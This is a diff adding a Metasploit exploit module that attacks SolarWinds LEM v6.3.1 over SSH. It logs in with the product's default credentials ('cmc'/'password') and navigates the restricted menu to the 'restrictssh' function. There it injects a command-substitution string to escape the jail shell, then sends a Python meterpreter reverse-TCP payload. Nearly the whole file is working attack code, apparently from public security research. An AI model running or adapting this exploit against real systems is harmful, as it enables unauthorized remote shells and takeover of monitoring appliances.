@@ -1,0 +1,164 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::SSH
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "SolarWind LEM Default SSH Password Remote Code Execution",
+      'Description'    => %q{
+        This module exploits the default credentials of SolarWind LEM. A menu system is encountered when the SSH
+        service is accessed with the default username and password which is "cmc" and "password". By exploiting a
+        vulnerability that exist on the menuing script, an attacker can escape from restricted shell.
+
+        This module was tested against SolarWinds LEM v6.3.1.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Mehmet Ince <mehmet@mehmetince.net>',  # discovery & msf module
+        ],
+      'References'     =>
+        [
+          ['URL',   'http://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/']
+        ],
+      'DefaultOptions' =>
+        {
+          'Payload' => 'python/meterpreter/reverse_tcp',
+        },
+      'Platform'       => ['python'],
+      'Arch'           => ARCH_PYTHON,
+      'Targets'        => [ ['Automatic', {}] ],
+      'Privileged'     => false,
+      'DisclosureDate' => "Mar 17 2017",
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+      [
+        Opt::RPORT(32022),
+        OptString.new('USERNAME', [ true, 'The username for authentication', 'cmc' ]),
+        OptString.new('PASSWORD', [ true, 'The password for authentication', 'password' ]),
+      ]
+    )
+
+    register_advanced_options(
+      [
+        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
+        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
+      ]
+    )
+  end
+
+  def rhost
+    datastore['RHOST']
+  end
+
+  def rport
+    datastore['RPORT']
+  end
+
+  def username
+    datastore['USERNAME']
+  end
+
+  def password
+    datastore['PASSWORD']
+  end
+
+  def exploit
+    factory = ssh_socket_factory
+    opts = {
+      :auth_methods => ['keyboard-interactive'],
+      :port         => rport,
+      :use_agent => false,
+      :config => false,
+      :password => password,
+      :proxy => factory,
+      :non_interactive => true
+    }
+
+    opts.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
+
+    print_status("#{rhost}:#{rport} - Attempting to login...")
+
+    begin
+      ssh = nil
+      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
+        ssh = Net::SSH.start(rhost, username, opts)
+      end
+    rescue Rex::ConnectionError
+      return
+    rescue Net::SSH::Disconnect, ::EOFError
+      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
+      return
+    rescue ::Timeout::Error
+      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
+      return
+    rescue Net::SSH::AuthenticationFailed
+      print_error "#{rhost}:#{rport} SSH - Failed authentication due wrong credentials."
+    rescue Net::SSH::Exception => e
+      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
+      return
+    end
+
+    if ssh
+      payload_executed = false
+      print_good("SSH connection is established.")
+
+      ssh.open_channel do |channel|
+        print_status("Requesting pty... We need it in order to interact with menuing system.")
+
+        channel.request_pty do |ch, success|
+          raise ::RuntimeError, "Could not request pty!" unless success
+          print_good("Pty successfully obtained.")
+
+          print_status("Requesting a shell.")
+          ch.send_channel_request("shell") do |ch, success|
+            raise ::RuntimeError, "Could not open shell!" unless success
+            print_good("Remote shell successfully obtained.")
+          end
+        end
+
+        channel.on_data do |ch, data|
+          if data.include? "cmc "
+            print_good("Step 1 is done. Managed to access terminal menu.")
+            channel.send_data("service\n")
+          end
+
+          if data.include? "service "
+            print_good("Step 2 is done. Managed to select 'service' sub menu.")
+            channel.send_data("restrictssh\n")
+          end
+
+          if data.include? "Press <enter> to configure restriction on the SSH service to the Manager Appliance"
+            print_good("Step 3 is done. Managed to start 'restrictssh' function.")
+            channel.send_data("*#`bash>&2`\n")
+          end
+
+          if data.include? "Are the hosts"
+            print_good("Step 4 is done. We are going to try escape from jail shell.")
+            channel.send_data("Y\n")
+          end
+
+          if data.include? "/usr/local/contego"
+            if payload_executed == false
+              print_good("Sweet..! Escaped from jail.")
+              print_status("Delivering payload...")
+              channel.send_data("python -c \"#{payload.encoded}\"\n")
+              payload_executed = true
+            end
+          end
+
+        end
+      end
+      ssh.loop unless session_created?
+    end
+  end
+
+end
